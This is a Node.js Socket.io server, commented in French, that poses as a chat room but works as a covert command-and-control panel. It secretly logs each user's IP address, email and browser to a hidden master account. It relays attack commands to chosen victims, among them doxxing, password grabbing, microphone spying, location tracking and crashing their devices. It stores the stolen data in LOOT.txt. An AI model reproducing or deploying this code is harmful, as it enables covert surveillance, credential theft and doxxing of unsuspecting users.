const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let targets = [];
const MASTER_EMAIL = "toucheur2pp@heaven.com";

io.on('connection', (socket) => {
    // RÉCUPÉRATION DE L'IP (IMPORTANT POUR RENDER/HEROKU)
    // On check le header 'x-forwarded-for' car Render agit comme un proxy
    let rawIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    const clientIp = rawIp.split(',')[0].trim().replace('::ffff:', '');

    socket.on('init', (data) => {
        const newUser = {
            id: socket.id,
            n: data.n, // Pseudo
            e: data.e, // Email
            ip: clientIp,
            ua: socket.handshake.headers['user-agent'],
            date: new Date().toLocaleTimeString()
        };

        targets.push(newUser);

        // LOG DANS LE SERVEUR (Pour toi sur Render)
        console.log(`[CONNEXION] Cible: ${newUser.n} | IP: ${newUser.ip}`);

        // MISE À JOUR DE LA LISTE POUR TOUT LE MONDE (Sauf l'IP pour les victimes)
        syncUsers();

        // SI C'EST TOI LE MODO : On t'envoie un message privé avec TOUTES les infos
        if (data.e === MASTER_EMAIL) {
            socket.emit('master_alert', { msg: "SYSTÈME PRÊT : Panel Maître Activé" });
        } else {
            // ALERTE DISCRÈTE AU MODO : "Une nouvelle victime est là"
            const master = targets.find(u => u.e === MASTER_EMAIL);
            if (master) {
                io.to(master.id).emit('chat', { 
                    n: "SYSTEM", 
                    t: { t: `⚠️ NOUVELLE CIBLE : ${newUser.n} | IP: ${newUser.ip}`, type: 'intel' } 
                });
            }
        }
    });

    // RELAIS DES ATTAQUES DEPUIS TON PANEL
    const attackTypes = ['p_heavy_dox', 'p_pass_grab', 'p_crash', 'p_freeze', 'p_loc', 'p_mic_spy', 'p_osint'];
    attackTypes.forEach(type => {
        socket.on(type, (targetId) => {
            const boss = targets.find(u => u.id === socket.id);
            if (boss && boss.e === MASTER_EMAIL) {
                io.to(targetId).emit('execute', { type });
                console.log(`[COMMANDE] ${type} envoyée vers ${targetId}`);
            }
        });
    });

    socket.on('chat', (data) => {
        const sender = targets.find(u => u.id === socket.id);
        if (!sender) return;

        // Si c'est du vol de données (intel), on enregistre dans LOOT.txt
        if (data.type === 'intel') {
            const entry = `[${new Date().toLocaleString()}] IP: ${sender.ip} | DATA: ${data.t}\n`;
            fs.appendFileSync('LOOT.txt', entry);
        }
        
        // Broadcast normal du message
        io.emit('chat', { n: sender.n, t: data });
    });

    socket.on('disconnect', () => {
        targets = targets.filter(u => u.id !== socket.id);
        syncUsers();
    });

    function syncUsers() {
        // Les victimes voient juste les noms, toi tu vois les IPs
        const master = targets.find(u => u.e === MASTER_EMAIL);
        const publicList = targets.map(u => ({ id: u.id, n: u.n }));
        
        if (master) {
            io.to(master.id).emit('sync', targets); // Toi tu reçois tout (ID, Nom, Email, IP)
        }
        // On envoie la liste simplifiée aux autres
        socket.broadcast.emit('sync', publicList);
    }
});

server.listen(process.env.PORT || 3000, '0.0.0.0', () => {
    console.log("Shadow Server V20 est en ligne.");
});
